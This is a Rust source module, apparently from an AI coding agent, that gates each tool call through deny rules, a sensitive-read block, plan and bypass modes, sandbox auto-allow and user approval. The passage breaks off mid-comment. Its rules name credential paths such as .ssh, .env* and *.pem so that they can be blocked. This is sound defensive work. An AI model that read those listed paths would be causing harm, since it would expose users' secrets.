//! permissions — the layered gate run before every tool execution, shaped
//! after claude-code's `hasPermissionsToUseToolInner` pipeline:
//!
//! deny rules → sensitive-read hard block → plan-mode read-only gate → bypass →
//! safety checks → ask rules → session scheduler controls → sandbox
//! auto-allow → read-only self-verdict → contained writes → allow
//! rules → session cache → ask the user.
//!
//! deny 与敏感读取硬拦截优先于所有模式，不能通过审批解除。
//! bypass 是用户显式选择的工具免审批模式：危险命令、敏感写入、ask 规则、
//! 复杂脚本与主动脱沙箱全部跳过审批。拒绝转换为 is_error tool_result，模型可改道，
//! 不会因此结束当前 turn。
//!
//! Plan mode ([`Mode::Plan`], cc's `plan` permission mode) sits below deny and
//! the credential-read hard block: a write/mutating call is refused outright —
//! agent explores read-only and acts only after the user approves the plan via
//! `exit_plan_mode`. It is placed above safety on purpose: a destructive
//! command in plan mode is a flat "no", not a "[destructive] approve?" prompt
//! whose yes would break the read-only promise. `exit_plan_mode` counts as
//! read-only here (it only shows the plan and flips the mode), so it passes.
//!
//! Bypass mode ([`Mode::Bypass`]) 不改变 OS 沙箱配置：普通调用仍在配置的沙箱内执行，
//! 主动 `disable_sandbox` 与失败后自动升级都免审批。选择该模式即接受执行代价；
//! 权限免审批本身不提供命令内容或文件系统隔离保证。
//!
//! The contained-writes layer is the file-tool counterpart of sandbox
//! auto-allow, and the reason kloop has no `acceptEdits` mode. `write_file` /
//! `edit_file` / `notebook_edit` resolve and open their target before the gate
//! runs, so a path landing inside the working directory is contained by
//! construction — the same argument that lets a sandboxed bash call skip the
//! human. Containment is a property of the call, not a trust level, so the
//! layer is unconditional instead of a mode. Manual 模式下，上方的 deny、
//! safety 与显式 ask 仍优先；`.git`、`.kloop`、`.ssh`、`.env*` 即使在 cwd 内也每次问。
//! Explicit ask rules —
//! one `ask = ["edit_file(**)"]` restores review-every-edit exactly, which is
//! why that behavior never needed a mode of its own. A write that
//! escapes the working directory is not contained and keeps asking.
//!
//! The sandbox auto-allow layer (cc's `autoAllowBashIfSandboxed`) is the
//! sandbox/approval coupling: a bash call the OS sandbox will contain needs
//! no human sign-off — containment replaces the parse-level vetting of the
//! layers below it, opaque scripts included. Everything above it still has
//! its say: deny rules, sensitive reads, safety checks, and — deliberately
//! stricter than cc — explicit ask rules ("always confirm this" is the user's
//! automation outranks it). Bypass 在这些审批层之前放行。
//! Dispatch feeds the verdict in per call.
//!
//! Bash content decisions run on the tree-sitter analysis in [`crate::shell`]:
//! a script the parser cannot fully vouch for is *opaque*：不能靠解析或 allow 规则放行，
//! 但沙箱、bypass 与逐字批准的会话记忆可放行。Native Windows PowerShell 不进 Bash
//! parser：manual 下询问或匹配 whole-tool allow，不进入会话记忆；bypass 直接放行。

use std::future::Future;
use std::path::Path;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::Arc;

use anyhow::Result;
use serde_json::Value;

mod argv_roles;
mod describe;
mod facts;
pub(crate) use facts::bash_protection_requirement;
mod policy;
mod rule;
pub(crate) mod sensitive;
#[cfg(test)]
mod testutil;

use describe::BLANKET_ESCALATION_RULE;
use describe::BLANKET_ESCALATION_SIGNATURE;
use describe::Remember;
use describe::clip;
use describe::describe;
use describe::describe_denial;
use describe::describe_escalation;
use describe::describe_parts;
use describe::describe_plan_exit;
use describe::escalation_remember_payload;
use describe::join_notices;
use describe::remember_payload;
use describe::sub_agent_notice;
use describe::tool_title;
use describe::user_denial;
pub(crate) use describe::user_stop;
use facts::Access;
pub(crate) use facts::CallFacts;
use facts::PathFacts;
use facts::ShellFacts;
pub use policy::GlobalPermissionPolicy;
pub use policy::PermissionSession;
pub use policy::ProjectPermissionPolicy;
pub use policy::ProjectPolicyRegistry;
use policy::advance_epoch;
use rule::Rule;
use rule::parse_rules;
use rule::rules_hit;

/// The scope a human may grant to one approval request.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ApprovalScope {
    Once,
    WorkspaceSession,
    Project,
}

/// An approver's answer to one confirmation request.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Decision {
    Allow(ApprovalScope),
    /// Not this call; the model carries on without it. For an approver with
    /// no one behind it (headless), and for a client that asked for exactly that.
    Deny,
    /// Not this call, and stop the turn here: the user will say what to do
    /// instead. What a person's No means (plan 216).
    Stop,
}

/// Why the gate refused a call, when the difference matters to the turn.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum Refusal {
    /// A rule, a mode, or an answer that leaves the model free to go on.
    Denied(String),
    /// The person answered [`Decision::Stop`]: this call does not run, and the
    /// turn ends once its batch is done.
    Stopped,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PermissionNotice {
    pub message: String,
}

/// The supporting detail an approval carries, and what kind of thing it is.
/// Core knows which kind it just built; a frontend handed a bare string can
/// only guess, and the guesses were wrong in all three of them — a plan read as
/// a diff comes out coloured like deletions, summarised as `+0 -7`, and
/// reported over the wire as a file change (plan 194).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ConfirmPreview {
    /// A file change's diff: lines prefixed `+`/`-`/space by [`crate::diff`],
    /// meant to be read with those signs coloured.
    FileChange(String),
    /// A plan put up for sign-off: markdown, and long enough that it belongs in
    /// the transcript rather than a popup body.
    Plan(String),
}

impl ConfirmPreview {
    /// The text itself, for a surface that shows it without distinguishing.
    pub fn text(&self) -> &str {
        match self {
            ConfirmPreview::FileChange(text) | ConfirmPreview::Plan(text) => text,
        }
    }
}

/// One confirmation request. `approval_scopes` is authoritative: frontends
/// render only those choices and core rejects any answer outside the list.
///
/// `description` is the flat one-line form every surface can print. `title` /
/// `detail` / `notice` are the same content pulled apart for frontends that lay
/// a prompt out over several lines (the TUI's inline panel, plan 104): what kind
/// of action this is, the one thing it acts on, and why the question is being
/// asked at all. A frontend with no use for them prints `description` alone.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ConfirmRequest {
    pub description: String,
    pub title: Option<String>,
    pub detail: Option<String>,
    pub notice: Option<String>,
    pub approval_scopes: Vec<ApprovalScope>,
    pub remember_rules: Option<Vec<String>>,
    pub preview: Option<ConfirmPreview>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum EscalationApproval {
    User,
    Bypass,
    Remembered,
}

/// [`Permissions::escalate_sandbox`] 的结果，同时保留脱沙箱重试的授权来源。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum EscalationOutcome {
    /// 已获准裸跑；结果必须标明实际授权来源。
    Approved(EscalationApproval),
    /// The user was asked and declined: keep the sandboxed failure and do
    /// not invite a disable_sandbox retry.
    Declined,
    /// Declined with [`Decision::Stop`]: as `Declined`, and the turn ends.
    Stopped,
    /// Not asked (no approver, or tests/`--mock`): fall back to the
    /// model-driven denial hint.
    NotAttempted,
}

/// The asking seam, separate from `Ui` so the streaming-output trait stays
/// synchronous. The type-erased future shape mirrors `execute_tool`: it
/// keeps the trait object-safe without an async-trait dependency.
pub trait Approver: Send + Sync {
    fn confirm(&self, req: ConfirmRequest) -> Pin<Box<dyn Future<Output = Decision> + Send + '_>>;
}

/// Gating mode, after cc's permission modes.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum Mode {
    /// Ask before any call the gate cannot vouch for on its own — the mode
    /// with the most oversight, and the one in effect when no
    /// `--permission-mode` is given. cc's `default` mode, which it surfaces to
    /// the user as "Manual"; kloop uses `manual` as the one name, value and
    /// label alike. cc's second mode, `acceptEdits`, has no counterpart: its
    /// only effect was auto-approving file writes inside the working
    /// directory, which the contained-writes layer now does unconditionally,
    /// leaving nothing for a mode to hold.
    #[default]
    Manual,
    /// 跳过全部工具权限审批，保留 deny 与敏感读取硬拦截；不改变 OS 沙箱配置。
    Bypass,
    /// Read-only exploration only: every write/mutating call is refused so the
    /// agent plans first and acts only after the user approves the plan via the
    /// `exit_plan_mode` tool (cc's `plan` permission mode).
    Plan,
}

impl Mode {
    /// Short name shown in the CLI flag, the TUI status bar, and prompt text.
    pub fn label(self) -> &'static str {
        match self {
            Mode::Manual => "manual",
            Mode::Bypass => "bypass",
            Mode::Plan => "plan",
        }
    }

    /// The next mode in the shift+Tab cycle — manual ⇄ plan. Bypass is
    /// deliberately NOT reached by cycling — it is the dangerous one, opted
    /// into explicitly with `--permission-mode bypass`; stepping out of it
    /// lands on manual.
    pub fn cycled(self) -> Mode {
        match self {
            Mode::Manual => Mode::Plan,
            Mode::Plan => Mode::Manual,
            Mode::Bypass => Mode::Manual,
        }
    }
}

/// The outcome of [`Permissions::confirm_exit_plan`] — `exit_plan_mode`'s
/// approval step.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum PlanExitOutcome {
    /// Approved (or no gate): plan mode is off; the restored mode is returned.
    Approved(Mode),
    /// The user declined: the session stays in plan mode.
    Declined,
    /// Declined with [`Decision::Stop`]: still in plan mode, and the turn ends.
    Stopped,
    /// No approver available (headless / no TTY): the tool reports the block.
    NoApprover,
}

/// Raw rule strings by behavior, before parsing. Formats:
/// `tool_name` (whole tool), `bash(<tokens>)` / `bash(<tokens> *)`
/// (per-segment argv prefix), `write_file(<glob>)` / `edit_file(<glob>)` /
/// `read_file(<glob>)` (path glob, gitignore-style `**` supported).
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct PermissionRules {
    pub allow: Vec<String>,
    pub deny: Vec<String>,
    pub ask: Vec<String>,
}

/// Parsed durable allow rules. Construction always goes through the same parser
/// the runtime gate uses, so the CLI store cannot publish syntax the gate would
/// interpret differently after restart.
#[derive(Clone, Debug)]
pub struct ProjectAllowRules {
    raw: Vec<String>,
    parsed: Vec<Rule>,
}

impl ProjectAllowRules {
    pub fn parse(entries: &[String]) -> Result<Self> {
        Ok(Self {
            raw: entries.to_vec(),
            parsed: parse_rules(entries)?,
        })
    }

    pub fn empty() -> Self {
        Self {
            raw: Vec::new(),
            parsed: Vec::new(),
        }
    }

    pub fn raw(&self) -> &[String] {
        &self.raw
    }

    fn parsed(&self) -> &[Rule] {
        &self.parsed
    }
}

impl PartialEq for ProjectAllowRules {
    fn eq(&self, other: &Self) -> bool {
        self.raw == other.raw
    }
}

impl Eq for ProjectAllowRules {}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ProjectPolicySnapshot {
    pub revision: u64,
    pub allow: ProjectAllowRules,
}

impl ProjectPolicySnapshot {
    pub fn empty() -> Self {
        Self {
            revision: 0,
            allow: ProjectAllowRules::empty(),
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProjectPolicyStoreError {
    Unavailable,
    Invalid,
    PersistenceFailed,
}

impl std::fmt::Display for ProjectPolicyStoreError {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter.write_str(match self {
            Self::Unavailable => "project permission storage is unavailable",
            Self::Invalid => "project permission storage is invalid",
            Self::PersistenceFailed => "project permission storage could not be updated",
        })
    }
}

impl std::error::Error for ProjectPolicyStoreError {}

pub trait ProjectPermissionWriter: Send + Sync {
    fn append_allow(
        &self,
        project_id: crate::project::ProjectId,
        additions: ProjectAllowRules,
    ) -> Pin<
        Box<
            dyn Future<Output = std::result::Result<ProjectPolicySnapshot, ProjectPolicyStoreError>>
                + Send
                + '_,
        >,
    >;
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
pub(crate) struct PermissionCapabilityEpoch {
    project: u64,
    mode: u64,
    workspace_session: u64,
}

pub struct Permissions {
    /// Tests and `--mock` only: skip every layer including deny.
    allow_everything: bool,
    global: Arc<GlobalPermissionPolicy>,
    project: Arc<ProjectPermissionPolicy>,
    session: Arc<PermissionSession>,
    identity: crate::project::WorkspaceIdentity,
}

impl Permissions {
    /// No gating at all — for tests and the keyless `--mock` demo, where
    /// nobody is at the keyboard. The CLI's bypass mode is not this escape.
    pub fn allow_all() -> Self {
        Self {
            allow_everything: true,
            global: Arc::new(GlobalPermissionPolicy::empty()),
            project: Arc::new(ProjectPermissionPolicy::unavailable()),
            session: Arc::new(PermissionSession::new(Mode::Bypass, None)),
            identity: crate::project::WorkspaceIdentity::ephemeral(PathBuf::from("/")),
        }
    }

    /// Compatibility constructor for focused gates and test fixtures. `allow`
    /// entries seed the project layer, never the global layer.
    pub fn new(
        mode: Mode,
        rules: &PermissionRules,
        cwd: PathBuf,
        approver: Option<Arc<dyn Approver>>,
    ) -> Result<Self> {
        let identity = crate::project::WorkspaceIdentity::resolve(&cwd);
        let project = match identity.project_id().cloned() {
            Some(project_id) => ProjectPermissionPolicy::available(
                project_id,
                ProjectPolicySnapshot {
                    revision: 0,
                    allow: ProjectAllowRules::parse(&rules.allow)?,
                },
                None,
            ),
            None => ProjectPermissionPolicy::unavailable(),
        };
        Ok(Self {
            allow_everything: false,
            global: Arc::new(GlobalPermissionPolicy::new(&rules.deny, &rules.ask)?),
            project: Arc::new(project),
            session: Arc::new(PermissionSession::new(mode, approver)),
            identity,
        })
    }

    pub fn from_layers(
        global: Arc<GlobalPermissionPolicy>,
        project: Arc<ProjectPermissionPolicy>,
        session: Arc<PermissionSession>,
        identity: crate::project::WorkspaceIdentity,
    ) -> Self {
        Self {
            allow_everything: false,
            global,
            project,
            session,
            identity,
        }
    }

    pub fn identity(&self) -> &crate::project::WorkspaceIdentity {
        &self.identity
    }

    /// The gate a fresh session (`/clear`, rewind) starts with. The global and
    /// project layers and the approver carry over; the session layer does not:
    /// nothing it remembered is still granted. The mode is the user's way of
    /// working and stays — except plan mode, which was entered for the old
    /// conversation's task and falls back to the mode it was entered from.
    pub fn fresh_session(&self) -> Self {
        let mode = {
            let state = self.session.mode.lock().unwrap();
            match state.current {
                Mode::Plan => state.pre_plan,
                current => current,
            }
        };
        Self {
            allow_everything: self.allow_everything,
            global: Arc::clone(&self.global),
            project: Arc::clone(&self.project),
            session: Arc::new(PermissionSession::new(mode, self.session.approver.clone())),
            identity: self.identity.clone(),
        }
    }

    pub(crate) fn capability_epoch(&self) -> PermissionCapabilityEpoch {
        let project = self.project.capability_epoch();
        let mode = self.session.mode.lock().unwrap().capability_epoch;
        let workspace_session = self
            .session
            .cache
            .lock()
            .unwrap()
            .get(self.identity.workspace_id())
            .map_or(0, |cache| cache.capability_epoch);
        PermissionCapabilityEpoch {
            project,
            mode,
            workspace_session,
        }
    }

    pub fn for_workspace(&self, identity: crate::project::WorkspaceIdentity) -> Self {
        Self {
            allow_everything: self.allow_everything,
            global: Arc::clone(&self.global),
            project: Arc::clone(&self.project),
            session: Arc::clone(&self.session),
            identity,
        }
    }

    /// The gating mode in effect right now.
    pub fn mode(&self) -> Mode {
        self.session.mode.lock().unwrap().current
    }

    /// Change the gating mode at runtime (the TUI's shift+Tab cycle). Entering
    /// plan mode from a non-plan mode records what to restore on a later
    /// `exit_plan_mode` approval.
    pub fn set_mode(&self, mode: Mode) {
        let mut state = self.session.mode.lock().unwrap();
        if state.current == mode {
            return;
        }
        if mode == Mode::Plan {
            state.pre_plan = state.current;
        }
        state.current = mode;
        advance_epoch(&mut state.capability_epoch, "permission mode");
    }

    /// Enter plan mode as one session transition. Returns true only when the
    /// mode changed; repeated EnterPlanMode calls are idempotent and preserve
    /// the original pre-plan mode.
    pub fn enter_plan(&self) -> bool {
        let mut state = self.session.mode.lock().unwrap();
        if state.current == Mode::Plan {
            return false;
        }
        state.pre_plan = state.current;
        state.current = Mode::Plan;
        advance_epoch(&mut state.capability_epoch, "permission mode");
        true
    }

    /// Leave plan mode, restoring the mode active when it was entered (manual
    /// if none was recorded); returns the restored mode.
    fn exit_plan(&self) -> Mode {
        let mut state = self.session.mode.lock().unwrap();
        let restore = state.pre_plan;
        if state.current == restore {
            return restore;
        }
        state.current = restore;
        advance_epoch(&mut state.capability_epoch, "permission mode");
        restore
    }

    /// `exit_plan_mode`'s approval step: present the plan for sign-off. On
    /// approval, leave plan mode (restoring the pre-plan mode) and return it; on
    /// denial, stay in plan mode. Like [`Permissions::escalate_sandbox`], this
    /// does not re-litigate the call — it only shows the plan and flips the mode.
    pub async fn confirm_exit_plan(&self, plan: &str, depth: u8) -> PlanExitOutcome {
        // Tests / `--mock`: no gate at all, so honor the exit without a prompt.
        if self.allow_everything {
            return PlanExitOutcome::Approved(self.exit_plan());
        }
        let Some(approver) = &self.session.approver else {
            return PlanExitOutcome::NoApprover;
        };
        let req = ConfirmRequest {
            description: describe_plan_exit(depth),
            title: Some("Exit plan mode".to_string()),
            detail: None,
            notice: sub_agent_notice(depth),
            approval_scopes: vec![ApprovalScope::Once],
            remember_rules: None,
            preview: Some(ConfirmPreview::Plan(plan.to_string())),
        };
        match approver.confirm(req).await {
            Decision::Allow(ApprovalScope::Once) => PlanExitOutcome::Approved(self.exit_plan()),
            Decision::Allow(ApprovalScope::WorkspaceSession | ApprovalScope::Project)
            | Decision::Deny => PlanExitOutcome::Declined,
            Decision::Stop => PlanExitOutcome::Stopped,
        }
    }

    /// Whether this tool call may run. A successful result may carry a safe,
    /// user-visible notice (for example, a project grant that ran once because
    /// durable persistence failed).
    /// The sandbox-blind form (no auto-allow layer); dispatch uses
    /// [`Permissions::check_call`] with the per-call sandbox verdict.
    pub async fn check(
        &self,
        name: &str,
        input: &Value,
        depth: u8,
    ) -> Result<Option<PermissionNotice>, String> {
        self.check_call(name, input, depth, /*sandbox_auto_allow*/ false)
            .await
    }

    /// `sandbox_auto_allow`: this call will execute inside an OS sandbox
    /// whose policy opts into approval-free contained runs. Only dispatch
    /// can know that (it is a fact of the call, not of the gate), so it
    /// arrives as a parameter.
    ///
    /// For a caller outside any turn (a `!cmd` injection, a scheduled check):
    /// there is no turn to stop, so a [`Decision::Stop`] reads as a plain denial.
    pub async fn check_call(
        &self,
        name: &str,
        input: &Value,
        depth: u8,
        sandbox_auto_allow: bool,
    ) -> Result<Option<PermissionNotice>, String> {
        self.check_call_with_resolved_path(
            name,
            input,
            None,
            None,
            depth,
            crate::sandbox::ExecutionContext::approval_only(sandbox_auto_allow),
        )
        .await
        .map_err(|refusal| match refusal {
            Refusal::Denied(reason) => reason,
            Refusal::Stopped => user_denial(name),
        })
    }

    pub(crate) async fn check_call_with_execution(
        &self,
        name: &str,
        input: &Value,
        depth: u8,
        execution: crate::sandbox::ExecutionContext<'_>,
    ) -> Result<Option<PermissionNotice>, String> {
        self.check_call_with_resolved_path(name, input, None, None, depth, execution)
            .await
            .map_err(|refusal| match refusal {
                Refusal::Denied(reason) => reason,
                Refusal::Stopped => user_denial(name),
            })
    }

    /// Mutation dispatch resolves and opens the target parent before permission.
    /// Supplying that effective path keeps safety/containment on the frozen
    /// target while path rules still see the model's original alias spelling.
    pub(crate) async fn check_call_with_resolved_path(
        &self,
        name: &str,
        input: &Value,
        resolved_path: Option<&Path>,
        preview_context: Option<&crate::diff::MutationPreviewContext>,
        depth: u8,
        execution: crate::sandbox::ExecutionContext<'_>,
    ) -> Result<Option<PermissionNotice>, Refusal> {
        if self.allow_everything {
            return Ok(None);
        }
        let call = CallFacts::gather_with_execution(
            name,
            input,
            self.identity.cwd(),
            resolved_path,
            execution,
        );
        let resolved_input = call
            .path
            .as_ref()
            .zip(call.path_key)
            .map(|(path, path_key)| {
                let mut resolved = input.clone();
                resolved[path_key] = Value::String(path.normalized.to_string_lossy().into_owned());
                resolved
            });
        let approval_input = resolved_input.as_ref().unwrap_or(input);

        // 1. Deny rules — before everything, immune to every mode.
        if self.matches_deny(name, &call) {
            return Err(Refusal::Denied(format!(
                "{name}: blocked by a deny permission rule. Do not retry this call or try to \
                 work around the rule; choose a different approach or ask the user."
            )));
        }

        // 2. Sensitive reads — credentials and agent state must never enter the
        // model context. This is a hard verdict before plan/sandbox/bypass and
        // cannot be remembered or approved away.
        if call.sensitive_read {
            return Err(Refusal::Denied(format!(
                "{name}: reading this sensitive path is blocked. Do not retry or work around the protection."
            )));
        }

        // 3. Plan mode — read-only exploration only. A mutating call is refused
        // outright (deny above still wins; safety/ask below never see one), so
        // the model plans and acts only after the user approves exit_plan_mode.
        // Above safety on purpose: a destructive command here is a flat "no",
        // not a "[destructive] approve?" whose yes would break the promise.
        if self.mode() == Mode::Plan && !call.is_readonly(name) {
            return Err(Refusal::Denied(format!(
                "{name}: this session is in plan mode, so only read-only exploration is allowed \
                 — file edits and commands with side effects are blocked. Keep investigating \
                 read-only, then call exit_plan_mode with your plan to get the user's approval \
                 before making any changes."
            )));
        }

        // 4. Bypass — 用户显式选择工具免审批，前面的硬限制仍优先。
        if self.mode() == Mode::Bypass {
            return Ok(None);
        }

        // 5. Safety checks — manual 下直接询问用户。
        if let Some(hazard) = call.hazard(name) {
            return self
                .ask_user(
                    name,
                    approval_input,
                    preview_context,
                    depth,
                    Some(hazard.tag),
                    None,
                )
                .await;
        }

        // 6. Explicit ask rules — "always confirm this"; never remembered.
        if self.matches_ask(name, &call) {
            return self
                .ask_user(name, approval_input, preview_context, depth, None, None)
                .await;
        }

        // 7. Safe session scheduler controls mutate only kloop's owner-scoped
        // registry/private store. Deny, plan mode, hazards and explicit ask
        // rules above retain priority; ordinary manual/accept/bypass modes do
        // not prompt for these controls.
        if matches!(name, "cron_create" | "cron_delete" | "schedule_wakeup") {
            return Ok(None);
        }

        // 8. Sandbox auto-allow — the OS sandbox will contain this call, so
        // nothing below (parse-level vetting, rules, the human) needs to be
        // consulted. Sits under deny/safety/ask: those keep their say.
        if execution.auto_allow && matches!(call.shell, Some(ShellFacts::Bash(_))) {
            return Ok(None);
        }

        // 9. Read-only self-verdict.
        if call.is_readonly(name) {
            return Ok(None);
        }

        // 10. Contained writes: a structured file write whose target lands
        // inside the working directory. Dispatch resolved and froze that target
        // before the gate ran, so the call is contained the way a sandboxed
        // bash call is — and containment, not a trust level, is what replaces
        // the human. Everything above already had its say: sensitive paths
        // (`.git`, `.kloop`, `.env*`…) ask from the safety layer even in-cwd,
        // and an `ask = ["edit_file(**)"]` rule restores review-every-edit.
        // A path escaping the cwd is not contained and falls through.
        if matches!(name, "write_file" | "edit_file" | "notebook_edit")
            && call.path.as_ref().is_some_and(|p| p.inside_cwd)
        {
            return Ok(None);
        }

        // 11. Allow rules.
        if self.matches_allow(name, &call) {
            return Ok(None);
        }

        // 12. Session cache.
        let remember = remember_payload(name, &call);
        if let Some(remember) = &remember {
            let caches = self.session.cache.lock().unwrap();
            if caches
                .get(self.identity.workspace_id())
                .is_some_and(|cache| {
                    remember
                        .signatures
                        .iter()
                        .all(|signature| cache.signatures.contains(signature))
                })
            {
                return Ok(None);
            }
        }

        // 13. Ask.
        self.ask_user(name, approval_input, preview_context, depth, None, remember)
            .await
    }

    fn matches_deny(&self, name: &str, call: &CallFacts) -> bool {
        rules_hit(&self.global.deny, name, call)
    }

    fn matches_ask(&self, name: &str, call: &CallFacts) -> bool {
        rules_hit(&self.global.ask, name, call)
    }

    /// Allow is the strict direction: every bash argv must be read-only or
    /// rule-matched (un-stripped — wrappers must be spelled out), and opaque
    /// bash never matches.
    fn matches_allow(&self, name: &str, call: &CallFacts) -> bool {
        self.project.matches_allow(name, call)
    }

    async fn ask_user(
        &self,
        name: &str,
        input: &Value,
        preview_context: Option<&crate::diff::MutationPreviewContext>,
        depth: u8,
        hazard_tag: Option<&str>,
        remember: Option<Remember>,
    ) -> Result<Option<PermissionNotice>, Refusal> {
        let denied = || Refusal::Denied(user_denial(name));
        let Some(approver) = &self.session.approver else {
            return Err(Refusal::Denied(format!(
                "{name}: approval required but no approver is available in this mode; denied."
            )));
        };
        let mut approval_scopes = vec![ApprovalScope::Once];
        if let Some(remember) = &remember {
            approval_scopes.push(ApprovalScope::WorkspaceSession);
            if remember.persistable() && self.project.can_persist() {
                approval_scopes.push(ApprovalScope::Project);
            }
        }
        let (title, detail, notice) = describe_parts(name, input, depth, hazard_tag);
        let req = ConfirmRequest {
            description: describe(name, input, depth, hazard_tag),
            title: Some(title),
            detail: Some(detail),
            notice,
            approval_scopes: approval_scopes.clone(),
            remember_rules: remember.as_ref().map(|remember| remember.echo.clone()),
            preview: crate::diff::file_change_preview_with_context(name, input, preview_context)
                .await
                .map(ConfirmPreview::FileChange),
        };
        let scope = match approver.confirm(req).await {
            Decision::Allow(scope) => scope,
            Decision::Deny => return Err(denied()),
            Decision::Stop => return Err(Refusal::Stopped),
        };
        if !approval_scopes.contains(&scope) {
            return Err(denied());
        }
        match scope {
            ApprovalScope::Once => Ok(None),
            ApprovalScope::WorkspaceSession => {
                let Some(remember) = remember else {
                    return Err(denied());
                };
                self.remember_in_session(remember.signatures);
                Ok(None)
            }
            ApprovalScope::Project => {
                let Some(remember) = remember else {
                    return Err(denied());
                };
                let additions = ProjectAllowRules::parse(&remember.rules).map_err(|_| denied())?;
                match self.project.persist(additions).await {
                    Ok(_) => Ok(None),
                    Err(_) => Ok(Some(PermissionNotice {
                        message: "project approval applied to this call only; the durable project rule was not saved"
                            .into(),
                    })),
                }
            }
        }
    }

    /// Whether a read-class tool (grep/glob) must hide this path from its
    /// output. cc's `getFileReadIgnorePatterns`: the read-ignore set is one
    /// verdict that every read tool honors uniformly, not a rule written per
    /// tool. So a `read_file` deny (`read_file(**/*.pem)`, or the whole-tool
    /// `read_file` form) and the sensitive-path list (`.env`/`.ssh`/…) both
    /// apply here — the same read-accessibility judgment the gate makes for
    /// `read_file`, but as an output filter instead of an ask (the gate's ask
    /// granularity is one path; a tree walk touches many, so grep/glob drop
    /// blocked hits and report the count rather than prompting).
    ///
    /// deny and the sensitive list survive every mode but `allow_all`
    /// (tests/`--mock`, where nothing is gated); `--permission-mode bypass` still
    /// filters，与权限门的 deny 和敏感读取硬拦截一致。
    pub fn read_path_blocked(&self, path: &Path) -> bool {
        self.read_path_blocked_with_resolved_path(path, None)
    }

    pub(crate) fn read_path_blocked_with_resolved_path(
        &self,
        path: &Path,
        resolved_path: Option<&Path>,
    ) -> bool {
        if self.allow_everything {
            return false;
        }
        let facts = PathFacts::gather_with_resolved(path, self.identity.cwd(), resolved_path);
        facts.sensitivity(Access::Read).is_some()
            || self
                .global
                .deny
                .iter()
                .any(|r| r.matches_path("read_file", &facts))
    }

    /// The escalation loop's consent step (codex's retry-on-denial): a
    /// bash command the OS sandbox contained failed in a denial-shaped way;
    /// ask whether to re-run it without the sandbox. The command already
    /// cleared this gate — deny rules and safety checks sit above the
    /// sandbox layers — so this asks only about removing containment, never
    /// re-litigates whether the command may run.
    pub async fn escalate_sandbox(
        &self,
        command: &str,
        denial: Option<&crate::sandbox::SandboxDenial>,
        depth: u8,
    ) -> EscalationOutcome {
        // Tests / `--mock`: nobody is watching (and the sandbox is off in
        // `--mock` anyway). Don't silently escalate.
        if self.allow_everything {
            return EscalationOutcome::NotAttempted;
        }
        // Bypass 的程序升级与模型主动 disable_sandbox 都免审批。
        if self.mode() == Mode::Bypass {
            return EscalationOutcome::Approved(EscalationApproval::Bypass);
        }
        // A remembered escalation answers before the ask, exactly as a durable
        // allow rule does for the ordinary gate. 固定输出还需写入范围；opaque
        // 只能使用本工作区会话的通配升级同意，不产生持久规则。
        let remember = escalation_remember_payload(command, self.identity.cwd());
        if self.blanket_escalation_granted()
            || remember
                .as_ref()
                .is_some_and(|remember| self.escalation_remembered(remember))
        {
            return EscalationOutcome::Approved(EscalationApproval::Remembered);
        }
        let Some(approver) = &self.session.approver else {
            return EscalationOutcome::NotAttempted;
        };
        // The session scope is offered either way; only the durable one needs a
        // rule it can be written down as.
        let mut approval_scopes = vec![ApprovalScope::Once, ApprovalScope::WorkspaceSession];
        if remember.is_some() && self.project.can_persist() {
            approval_scopes.push(ApprovalScope::Project);
        }
        let req = ConfirmRequest {
            description: describe_escalation(command, depth),
            title: Some(tool_title("bash").to_string()),
            detail: Some(clip(command)),
            notice: Some(join_notices(
                sub_agent_notice(depth),
                &describe_denial(denial),
            )),
            approval_scopes: approval_scopes.clone(),
            // Shown under the remembering choices. An opaque script has no rule
            // to echo, and leaving it blank would read as "just this command".
            remember_rules: Some(remember.as_ref().map_or_else(
                || vec![BLANKET_ESCALATION_RULE.to_string()],
                |remember| remember.echo.clone(),
            )),
            preview: None,
        };
        let scope = match approver.confirm(req).await {
            Decision::Allow(scope) => scope,
            Decision::Deny => return EscalationOutcome::Declined,
            Decision::Stop => return EscalationOutcome::Stopped,
        };
        if !approval_scopes.contains(&scope) {
            return EscalationOutcome::Declined;
        }
        match scope {
            ApprovalScope::Once => EscalationOutcome::Approved(EscalationApproval::User),
            ApprovalScope::WorkspaceSession => {
                let signatures = remember.map_or_else(
                    || vec![BLANKET_ESCALATION_SIGNATURE.to_string()],
                    |remember| remember.signatures,
                );
                self.remember_in_session(signatures);
                EscalationOutcome::Approved(EscalationApproval::User)
            }
            ApprovalScope::Project => {
                let Some(remember) = remember else {
                    return EscalationOutcome::Declined;
                };
                let Ok(additions) = ProjectAllowRules::parse(&remember.rules) else {
                    return EscalationOutcome::Declined;
                };
                // A failed durable write still approves this call — the user
                // said yes. It just will not be remembered, same as the
                // ordinary gate's project scope.
                let _ = self.project.persist(additions).await;
                EscalationOutcome::Approved(EscalationApproval::User)
            }
        }
    }

    /// Whether consent to run this command uncontained is already on record —
    /// asked *before* the sandboxed attempt, not after it failed. Remembering
    /// the answer only skips the question; skipping the attempt is what the
    /// answer was actually for, because the contained run is the expensive half
    /// (a test suite compiles, binds a port, and only then finds out it may
    /// not). Bypass mode is deliberately not consulted here: it means "do not
    /// ask", not "do not contain".
    pub fn sandbox_escalation_remembered(&self, command: &str) -> bool {
        if self.allow_everything {
            return false;
        }
        if self.blanket_escalation_granted() {
            return true;
        }
        escalation_remember_payload(command, self.identity.cwd())
            .is_some_and(|remember| self.escalation_remembered(&remember))
    }

    /// Whether this workspace session has blanket consent to escalate. It is the
    /// only thing an unparseable script can be remembered by: a review's probe
    /// scripts are opaque almost by construction (`tmp=$(mktemp -d …)`, a pipe
